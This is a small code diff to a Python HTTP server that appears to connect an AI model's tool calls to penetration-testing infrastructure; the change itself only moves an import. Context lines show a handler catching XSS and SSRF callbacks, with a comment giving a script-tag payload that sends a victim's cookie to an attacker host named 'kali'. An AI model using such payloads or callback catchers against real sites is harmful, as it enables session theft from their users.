@@ -15,7 +15,7 @@ import sys
 import urllib.request
 import urllib.parse
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse
+from urllib.parse import urlparse, parse_qs
 
 # ── Tool definitions (Claude tool_use format) ─────────────────────────────────
 TOOLS = {
@@ -1088,7 +1088,6 @@ class MCPHandler(BaseHTTPRequestHandler):
             self.wfile.write(body)
         elif path.startswith("/cb") or path.startswith("/xss") or path.startswith("/ssrf"):
             # XSS/SSRF GET callback (e.g. <script src=http://kali:3000/cb?c=COOKIE>)
-            from urllib.parse import urlparse, parse_qs
             qs = parse_qs(urlparse(self.path).query)
             entry = {
                 "time": __import__('datetime').datetime.now().isoformat(),
